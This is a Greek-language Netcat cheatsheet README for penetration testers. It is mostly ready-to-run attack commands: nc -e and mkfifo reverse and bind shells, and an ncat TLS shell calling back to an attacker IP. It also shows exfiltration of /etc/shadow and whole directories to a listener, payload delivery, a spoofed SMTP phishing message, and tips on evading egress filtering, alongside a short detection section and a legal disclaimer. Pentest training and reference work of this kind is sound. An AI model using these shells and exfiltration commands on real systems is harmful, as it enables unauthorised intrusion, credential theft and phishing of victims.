<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Πρωτόκολλα TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p align="center">
  <b>🌐 Διαβάστε και γράψτε ανεπεξέργαστα δεδομένα σε συνδέσεις δικτύου χρησιμοποιώντας πρωτόκολλα TCP και UDP</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The Netcat Philosophy](#-overview--the-netcat-philosophy)
- [Netcat Variants & The Flavor Dilemma](#-netcat-variants--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Παραδοσιακό Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Σύγκριση εργαλείων: Παραλλαγές Netcat εναντίον Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Παραλλαγές εγκατάστασης και εναλλαγής](#-installation--switching-variants)
- [Σημαίες γραμμής εντολών πυρήνα](#-core-command-line-flags)
- [Σάρωση θύρας και αρπαγή banner] (#-port-scanning--banner-grabbing)
- [Reverse & Bind Shells](#-reverse--bind-shells)
  - [Παραδοσιακή εκτέλεση κελύφους (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Κρυπτογραφημένο κέλυφος TLS με Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Τεχνικές μεταφοράς αρχείων](#-file-transfer-techniques)
  - [Target to Attacker (Exfiltration)](#target-to-attacker-exfiltration)
  - [Attacker to Target (Payload Delivery)](#attacker-to-target-payload-delivery)
  - [Αρχειοθέτηση καταλόγου On-the-Fly (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Προώθηση θύρας και ρελέ δικτύου] (#-port-forwarding--network-relays)
- [Web Server & Honeypot Emulation](#-web-server--honeypot-emulation)
- [Network Debugging & Manual Protocol Interaction](#-network-debugging--manual-protocol-interaction)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & The Netcat Philosophy

Αρχικά συντάχθηκε το 1995 από τον **Χόμπιτ**, το **Netcat** (συχνά επικαλείται απλώς ως `nc`) γιορτάζεται στις κοινότητες κυβερνοασφάλειας και Unix ως το **"TCP/IP Swiss Army Knife"**. 

Σε αντίθεση με τα πρωτόκολλα εφαρμογών υψηλού επιπέδου ή τα φουσκωμένα εργαλεία διαχείρισης, η Netcat κάνει ένα πράγμα εξαιρετικά καλά: **ανοίγει σωλήνες δικτύου σε επίπεδο ακατέργαστων byte μέσω υποδοχών TCP ή UDP και τις συνδέει απευθείας σε τυπική είσοδο (`stdin`) και τυπική έξοδο (`stdout`)**.

Είτε ακούτε αντίστροφα κελύφη, δημιουργείτε κρυφά κανάλια διείσδυσης, υπηρεσίες λήψης banner, μεταφέρετε αρχεία χωρίς SMB/FTP ή κάνετε διάγνωση φιλτραρίσματος πακέτων με τείχος προστασίας, το Netcat παραμένει ένα απαραίτητο βοηθητικό πρόγραμμα στο οπλοστάσιο κάθε επαγγελματία ασφαλείας.

---

## ⚖️ Netcat Variants & The Flavor Dilemma

Μία από τις πιο συχνές πηγές σύγχυσης κατά τη διάρκεια των δοκιμών διείσδυσης και των προκλήσεων CTF είναι ότι **πολλαπλές διαφορετικές υλοποιήσεις μοιράζονται την εντολή `nc`**. Η κατανόηση της παραλλαγής με την οποία αλληλεπιδράτε υπαγορεύει τη σύνταξη και τις δυνατότητες ωφέλιμου φορτίου.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Προεπιλογή σε:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Βασικό χαρακτηριστικό:** Από προεπιλογή, μεταγλωττίζεται χωρίς τη σημαία `-e` (πρόγραμμα εκτέλεσης) για την αποφυγή ασήμαντων αυθαίρετων ευπαθειών εκτέλεσης κώδικα.
- **Προσδιορισμός σύνταξης:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Λύση εκτέλεσης Shell:** Χρησιμοποιεί σωλήνες με όνομα Linux (`mkfifo`) για να γεφυρώσει τα `stdin` και `stdout` πίσω στο `/bin/sh`.

### Παραδοσιακό Netcat (`nc.traditional`)
- **Αρχικός συγγραφέας:** Hobbit (v1.10).
- **Βασικό χαρακτηριστικό:** Μεταγλωττίστηκε με την οδηγία `-DGAPING_SECURITY_HOLE`, επιτρέποντας την εγγενή σημαία `-e` / `-c` (`nc -e /bin/bash`).
- **Προσδιορισμός σύνταξης:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Συντηρείται από:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Βασικό χαρακτηριστικό:** Μια σύγχρονη επανεγγραφή που υποστηρίζει **κρυπτογράφηση TLS/SSL**, λίστες ελέγχου πρόσβασης IP (`--allow`, `--deny`), διαμεσολάβηση σύνδεσης (`--broker`), διακομιστή μεσολάβησης SOCKS4/5 και εγγενή εκτέλεση μεταξύ πλατφορμών.

---

## ⚖️ Σύγκριση εργαλείων: Παραλλαγές Netcat εναντίον Socat

| Χαρακτηριστικό | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|---------------------|--------------|---------|
| **Εκτέλεση σημαία (`-e`)** | ❌ Απογυμνωμένο | ✅ Εγγενής (`-e`) | ✅ Εγγενής (`-e`, `--exec`) | ✅ Εγγενής (`EXEC:`) |
| **Κρυπτογράφηση SSL / TLS ** | ❌ Όχι | ❌ Όχι | ✅ Εγγενής (`--ssl`) | ✅ Εγγενής (`OPENSSL:`) |
| **Κελύφη σωλήνων FIFO** | ✅ Ναι (`mkfifo`) | ✅ Ναι | ✅ Ναι | ✅ Ναι |
| **Λειτουργία σάρωσης θύρας** | ✅ Ναι (`-z`) | ✅ Ναι (`-z`) | ❌ Όχι | ❌ Όχι |
| **Επίμονος ακροατής** | ✅ Ναι (`-k`) | ❌ Όχι (Έξοδος κατά την αποσύνδεση) | ✅ Ναι (`-k`, `--keep-open`) | ✅ Ναι (`fork`) |
| **Υποστήριξη IPv6** | ✅ Εγγενής (`-6`) | ❌ Περιορισμένη | ✅ Εγγενής (`-6`) | ✅ Εγγενής |
| **Πελάτης μεσολάβησης / SOCKS** | ✅ Ναι (`-X`, `-x`) | ❌ Όχι | ✅ Ναι (`--proxy`) | ✅ Πλήρης υποστήριξη Proxy |
| **Συζήτηση πολλαπλών πελατών / Μεσίτης**| ❌ Όχι | ❌ Όχι | ✅ Εγγενής (`--broker`) | ❌ Μη αυτόματη ρύθμιση |
| **Προεπιλογή στο Kali / Debian** | ✅ Ναι (`/bin/nc`) | 🔄 Διαθέσιμο (`apt`) | 🔄 Διαθέσιμο (`ncat`) | 🔄 Διαθέσιμο (`socat`) |

---

## 📥 Παραλλαγές εγκατάστασης και εναλλαγής

Σε διανομές που βασίζονται στο Debian (συμπεριλαμβανομένου του Kali Linux), μπορείτε να εγκαταστήσετε όλες τις γεύσεις και να κάνετε εναλλαγή μεταξύ τους μέσω του `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Για να εκτελέσετε ρητά μια συγκεκριμένη παραλλαγή χωρίς να αλλάξετε τις προεπιλογές σε όλο το σύστημα:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Σημαίες γραμμής εντολών πυρήνα

| Σημαία | Σημασία & Περιγραφή |
|------|-----------------------|
| `-l` | **Λειτουργία ακρόασης**: Περιμένετε για εισερχόμενες συνδέσεις αντί να ξεκινήσετε τις εξερχόμενες συνδέσεις. |
| `-v` | **Λειτουργία λειτουργίας**: Εκτύπωση λεπτομερών πληροφοριών σύνδεσης και διαγνωστικού ελέγχου (`-vv` για υψηλότερη ευκρίνεια). |
| `-n` | **Αριθμητική μόνο IP**: Απενεργοποιήστε την αντίστροφη ανάλυση DNS για ταχύτητα και μυστικότητα. |
| `-p <port>` | **Τοπική θύρα**: Καθορίστε την τοπική θύρα για σύνδεση ή ακρόαση. |
| `-u` | **Λειτουργία UDP**: Χρησιμοποιήστε το πρωτόκολλο UDP αντί για την προεπιλεγμένη ροή TCP. |
| `-k` | **Συνεχίστε να ακούτε**: Συνεχίστε να ακούτε και να αποδέχεστε νέες συνδέσεις μετά την αποσύνδεση ενός πελάτη. |
| `-w <sec>` | **Χρονικό όριο**: Λήξη χρονικού ορίου σε δευτερόλεπτα για εγκατάσταση σύνδεσης και αναγνώσεις πρίζας αδράνειας. |
| `-z` | **Λειτουργία Zero-I/O**: Λειτουργία σάρωσης. μην στείλετε δεδομένα ωφέλιμου φορτίου και κλείστε την υποδοχή αμέσως μετά την χειραψία. |
| `-q <sec>` | **Τερματισμός μετά το EOF**: Περιμένετε καθορισμένα δευτερόλεπτα μετά τη λήψη του EOF στο `stdin` πριν από τον τερματισμό. |
| `-s <ip>` | **Πηγή IP**: Σύνδεση σε μια συγκεκριμένη τοπική διεπαφή / διεύθυνση IP πηγής. |
| `-4` / `-6` | Επιβολή αποκλειστικής διευθυνσιοδότησης IPv4 ή IPv6. |

---

## 🔍 Σάρωση θυρών και αρπαγή banner

Ενώ τα ειδικά εργαλεία όπως το `nmap` ή το `masscan` προτιμώνται για ολοκληρωμένες σαρώσεις, το Netcat παρέχει έναν άμεσο έλεγχο θύρας μηδενικής εξάρτησης όταν προσγειώνεστε σε έναν περιορισμένο στόχο.

### Γρήγορη σάρωση θυρών
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Αρπαγή banner υπηρεσίας

Η αρπαγή banner εξάγει συμβολοσειρές ακατέργαστης έκδοσης από απομακρυσμένους δαίμονες για αναγνώριση ευπάθειας:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Αντίστροφα & Δέστε κοχύλια

Η σύνδεση ενός διερμηνέα απομακρυσμένων εντολών (`/bin/sh`, `/bin/bash`, `cmd.exe`) μέσω μιας υποδοχής Netcat είναι μια από τις πιο θεμελιώδεις τεχνικές δοκιμής διείσδυσης.

### Εκτέλεση παραδοσιακού κελύφους (`-e`)

Εάν το σύστημα προορισμού έχει εγκατεστημένο το `netcat-traditional` ή το `ncat` με υποστήριξη εκτέλεσης:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO Named Pipe Reverse Shell

Στις σύγχρονες διανομές Debian, Ubuntu, Kali και Fedora, το `nc` δεν έχει τη σημαία `-e`. Χρησιμοποιήστε ένα **FIFO (First-In-First-Out) με όνομα σωλήνα** για να ανακατευθύνετε την τυπική είσοδο και την τυπική έξοδο:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Πώς λειτουργεί ο αγωγός FIFO:
1. `rm -f /tmp/f`: Αφαιρεί τυχόν μπαγιάτικο αρχείο σωλήνα.
2. `mkfifo /tmp/f`: Δημιουργεί έναν ειδικό σωλήνα με το όνομα FIFO στο `/tmp`.
3. `cat /tmp/f`: Διαβάζει την είσοδο που παρέχεται στο σωλήνα και την προωθεί στο `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: Δημιουργεί ένα διαδραστικό κέλυφος, ανακατευθύνοντας το τυπικό σφάλμα (`stderr`) στην τυπική έξοδο (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: Μεταβιβάζει την έξοδο φλοιού μέσω του δικτύου στον εισβολέα, ενώ εγγράφει τα ληφθέντα πλήκτρα δικτύου πίσω στο `/tmp/f`.

### OpenBSD FIFO Bind Shell

Όταν ο στόχος έχει μια δημόσια ή τοπική IP με δυνατότητα δρομολόγησης και οι κανόνες εισερχόμενου τείχους προστασίας επιτρέπουν την κυκλοφορία:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Κρυπτογραφημένο κέλυφος TLS με Ncat (`--ssl`)

Η μη κρυπτογραφημένη κίνηση Netcat μπορεί να επιθεωρηθεί με IDS/IPS και πατήματα δικτύου. Το `ncat` υποστηρίζει εγγενώς κρυπτογράφηση TLS/SSL:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Τεχνικές μεταφοράς αρχείων

Όταν τα SSH, SCP, FTP και SMB αποκλείονται ή απεγκαθίστανται, το Netcat παρέχει μια άμεση, αμφίδρομη γραμμή μεταφοράς αρχείων σε οποιαδήποτε ανοιχτή θύρα TCP.

### Στόχευση σε εισβολέα (Εξαγωγή)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Επιτιθέμενος στον στόχο (Παράδοση ωφέλιμου φορτίου)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Επαλήθευση ακεραιότητας (Ποσά ελέγχου)

Πάντα να ελέγχετε την ακεραιότητα των byte μετά από ακατέργαστες μεταφορές Netcat:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Αρχειοθέτηση καταλόγου On-the-Fly (`tar + nc`)

Μεταφέρετε ολόκληρες δομές καταλόγου χωρίς τη δημιουργία ενδιάμεσων προσωρινών αρχείων αρχειοθέτησης στο δίσκο του θύματος:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Port Forwarding & Network Relays

Το Netcat μπορεί να λειτουργήσει ως ένα ελαφρύ ρελέ δικτύου χωρίς να απαιτείται προώθηση θύρας SSH:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Διακομιστής Ιστού & Εξομοίωση Honeypot

### Μινιμαλιστικός διακομιστής HTTP ενός αρχείου

Προβολή στατικού ωφέλιμου φορτίου HTTP ή λήψης διαπιστευτηρίων που υποβάλλονται από προγράμματα περιήγησης:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Συνομιλία πολλών πελατών / Μεσίτης μηνυμάτων (`ncat`)

Το Ncat περιλαμβάνει μια ενσωματωμένη λειτουργία μεσίτη, δημιουργώντας ένα ad-hoc δωμάτιο ρελέ τύπου IRC για χειριστές κόκκινων ομάδων:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Εντοπισμός σφαλμάτων δικτύου και αλληλεπίδραση με μη αυτόματο πρωτόκολλο

### Ακατέργαστη ένεση αλληλογραφίας SMTP
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Ακατέργαστη ανάκτηση αλληλογραφίας POP3
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Τυπικός ακροατής** | `nc -lvnp <PORT>` |
| **Επίμονος ακροατής** | `nc -lvnp <PORT> -k` |
| **Σύνδεση σε απομακρυσμένο κεντρικό υπολογιστή** | `nc -vn <HOST> <PORT>` |
| **Σύνδεση μέσω UDP** | `nc -u -vn <HOST> <PORT>` |
| **Σάρωση θύρας TCP (Γρήγορη)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Σάρωση θύρας UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD Named Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Παραδοσιακό Κοχύλι (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Κρυπτογραφημένο κέλυφος SSL (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Λήψη αρχείου (Exfil Listener)**| `nc -lvnp <PORT> > output_file` |
| **Αποστολή αρχείου (Exfil Sender)** | `nc -vn <IP> <PORT> < input_file` |
| **Φάκελος ροής μέσω Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Εξαγωγή φακέλου ροής** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Παράληψη banner** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Αμυντικές Θεωρήσεις & OPSEC

1. **Μη κρυπτογραφημένο Cleartext Προειδοποίηση:**
   - Το Standard Netcat **δεν** χρησιμοποιεί κρυπτογραφική ενθυλάκωση. Τυχόν κωδικοί πρόσβασης, διακριτικά περιόδου λειτουργίας ή εντολές φλοιού που αποστέλλονται μέσω καθαρού κειμένου `nc` μπορούν να εξαχθούν από αισθητήρες παρακολούθησης ασφάλειας δικτύου (NSM) (Zeek, Suricata, Wireshark).
   - Χρησιμοποιήστε `ncat --ssl` ή τυλίξτε την κυκλοφορία μέσα σε μια σήραγγα SSH/TLS όποτε είναι δυνατόν.
2. **Διαδικασία Έλεγχος & Sysmon:**
   - Σε συστήματα Linux, η καταγραφή εκτέλεσης διεργασιών (`auditd`, eBPF, Falco) επισημαίνει επικλήσεις του `nc` που περιέχουν σημαίες όπως το `-e` ή εντολές που δημιουργούν `/tmp/f` και `mkfifo`.
   - Στα Windows, οι πράκτορες EDR επισημαίνουν ή βάζουν σε καραντίνα τα δυαδικά αρχεία `nc.exe` λόγω γνωστών στατικών υπογραφών.
3. **Περιορισμοί εισερχομένων τείχους προστασίας:**
   - Να επιλέγετε πάντα κοινές θύρες εξόδου (`80`, `443`, `53`) όταν διαμορφώνετε συσκευές αναπαραγωγής αντίστροφου κελύφους για να παρακάμπτετε αυστηρές πολιτικές φιλτραρίσματος εξόδου.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Αυτό το cheatsheet έχει σχεδιαστεί μόνο για εξουσιοδοτημένες δοκιμές διείσδυσης, αξιολόγηση ευπάθειας, διαγωνισμούς CTF και σκοπούς διαχείρισης συστήματος. Η υποκλοπή κίνησης δικτύου, η διείσδυση δεδομένων ή η εκτέλεση αντίστροφων κελύφους έναντι συστημάτων χωρίς ρητή γραπτή συναίνεση είναι παράνομη και τιμωρείται σύμφωνα με τους νόμους για την ασφάλεια στον κυβερνοχώρο παγκοσμίως. Χρησιμοποιήστε υπεύθυνα και ηθικά.